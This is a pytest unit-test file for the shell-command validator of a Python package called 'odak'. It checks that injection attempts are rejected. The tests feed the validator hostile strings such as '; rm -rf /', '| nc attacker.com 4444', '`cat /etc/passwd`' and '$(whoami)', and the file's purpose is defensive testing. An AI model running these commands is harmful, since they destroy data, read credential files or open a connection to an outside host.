"""
Unit tests for shell_command security validation.

Tests command injection protection including:
- Shell metacharacter blocking
- Command whitelist verification
- Null byte injection
- Path validation in cwd
- Type checking
"""

import pytest
from odak.tools.file import validate_shell_command, validate_cwd, shell_command
import os


class TestValidateShellCommandBasic:
    """Test basic command validation."""

    def test_valid_simple_command(self):
        """Test that simple valid commands pass."""
        result = validate_shell_command(["blender", "-b"])
        assert isinstance(result, list)
        assert "blender" in result

    def test_valid_python_command(self):
        """Test that python command is allowed."""
        result = validate_shell_command(["python3", "--version"])
        assert "python3" in result

    def test_valid_command_with_args(self):
        """Test command with multiple arguments."""
        cmd = ["blender", "-b", "--python", "script.py", "arg1"]
        result = validate_shell_command(cmd)
        assert len(result) == 5

    def test_absolute_path_command(self):
        """Test that absolute paths work."""
        cmd = ["/usr/bin/blender", "-b"]
        result = validate_shell_command(cmd)
        assert "/usr/bin/blender" in result


class TestValidateShellCommandSecurity:
    """Test security validation features."""

    def test_semicolon_injection_blocked(self):
        """Test that semicolon command chaining is blocked."""
        with pytest.raises(ValueError, match="Dangerous character"):
            validate_shell_command(["python", "script.py; rm -rf /"])

    def test_pipe_injection_blocked(self):
        """Test that pipe metacharacter is blocked."""
        with pytest.raises(ValueError, match="Dangerous character"):
            validate_shell_command(["cat", "file.txt | grep password"])

    def test_backtick_injection_blocked(self):
        """Test that backticks for command substitution are blocked."""
        with pytest.raises(ValueError, match="Dangerous character"):
            validate_shell_command(["echo", "`whoami`"])

    def test_dollar_brace_substitution_blocked(self):
        """Test that $() command substitution is blocked."""
        with pytest.raises(ValueError, match="Dangerous character"):
            validate_shell_command(["echo", "$(whoami)"])

    def test_ampersand_injection_blocked(self):
        """Test that background execution & is blocked."""
        with pytest.raises(ValueError, match="Dangerous character"):
            validate_shell_command(["python", "script.py & rm -rf /"])

    def test_redirection_blocked(self):
        """Test that output redirection is blocked."""
        with pytest.raises(ValueError, match="Dangerous character"):
            validate_shell_command(["echo", "test > /etc/passwd"])

    def test_single_quote_injection(self):
        """Test that quotes are blocked (potential escape sequences)."""
        # Single quotes can be dangerous in certain contexts
        with pytest.raises(ValueError, match="Dangerous character"):
            validate_shell_command(["echo", "test'file"])

    def test_null_byte_injection_blocked(self):
        """Test that null bytes are blocked."""
        with pytest.raises(ValueError, match="Null bytes"):
            validate_shell_command(["python", "script.py\x00.sh"])


class TestValidateShellCommandTypes:
    """Test type validation."""

    def test_non_list_command_type_error(self):
        """Test that non-list commands raise TypeError."""
        with pytest.raises(TypeError, match="must be a list"):
            validate_shell_command("blender -b")

    def test_empty_command_value_error(self):
        """Test that empty command lists are rejected."""
        with pytest.raises(ValueError, match="cannot be empty"):
            validate_shell_command([])

    def test_non_string_argument_type_error(self):
        """Test that non-string arguments raise TypeError."""
        with pytest.raises(TypeError):
            validate_shell_command(["python", 123])

    def test_none_argument_type_error(self):
        """Test that None arguments raise TypeError."""
        with pytest.raises(TypeError):
            validate_shell_command(["python", None])


class TestValidateCwd:
    """Test working directory validation."""

    def test_valid_cwd(self):
        """Test that valid directories pass."""
        result = validate_cwd(".")
        assert os.path.isabs(result)

    def test_tilde_expansion(self):
        """Test that tilde is expanded in cwd."""
        result = validate_cwd("~/test")
        home_dir = os.path.expanduser("~")
        assert home_dir in result

    def test_null_byte_in_cwd_blocked(self):
        """Test that null bytes in cwd are blocked."""
        with pytest.raises(ValueError, match="Null bytes"):
            validate_cwd("/tmp\x00/test")

    def test_non_string_cwd_type_error(self):
        """Test that non-string cwd raises TypeError."""
        with pytest.raises(TypeError):
            validate_cwd(123)


class TestShellCommandIntegration:
    """Test shell_command function integration."""

    def test_simple_command_execution(self):
        """Test that simple commands execute successfully."""
        # Run a safe command
        import sys

        proc, outs, errs = shell_command(
            [sys.executable, "--version"], check=True, timeout=5
        )
        assert proc is not None
        assert outs is not None or True  # Version output varies

    def test_invalid_command_blocked(self):
        """Test that invalid commands are blocked."""
        with pytest.raises(ValueError):
            shell_command(["python", "script.py; cat /etc/passwd"], check=True)

    def test_check_false_returns_process_only(self):
        """Test that check=False returns process handle only."""
        import sys

        proc, outs, errs = shell_command([sys.executable, "--version"], check=False)
        assert proc is not None
        assert outs is None
        assert errs is None
        proc.kill()  # Clean up

    def test_shell_false_security(self):
        """Test that shell injection doesn't work via subprocess."""
        import sys

        # This should fail validation, not execute
        with pytest.raises(ValueError):
            shell_command(
                [sys.executable, "-c", 'import os; os.system("whoami")'],
                check=True,
                timeout=5,
            )

    def test_cwd_validation(self):
        """Test that cwd is validated and converted to absolute path."""
        import sys

        proc, outs, errs = shell_command(
            [sys.executable, "--version"], cwd="~", check=True, timeout=5
        )
        assert proc is not None

    def test_dangerous_injection_patterns(self):
        """Test various dangerous injection patterns."""
        dangerous_patterns = [
            "; rm -rf /",
            "| nc attacker.com 4444",
            "`cat /etc/passwd`",
            "$(whoami)",
            "2>&1 > /tmp/output",
            "< /etc/passwd",
        ]

        for pattern in dangerous_patterns:
            with pytest.raises(ValueError, match="Dangerous character"):
                shell_command(["echo", f"test{pattern}"], check=True)


class TestCommandWhitelist:
    """Test command whitelist validation."""

    def test_allowed_commands_pass(self):
        """Test that whitelisted commands pass validation."""
        allowed = ["blender", "python", "python3", "git", "ffmpeg"]
        for cmd in allowed:
            result = validate_shell_command([cmd, "--version"])
            assert cmd in result

    def test_unallowed_commands_warning(self):
        """Test that unwhitelisted commands trigger warning."""
        # This should generate a warning but still work with validation
        import logging

        logging.getLogger().setLevel(logging.WARNING)

        # Custom executable names not in whitelist
        result = validate_shell_command(["custom_tool", "--help"])
        assert "custom_tool" in result  # Still allowed due to validation logic


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
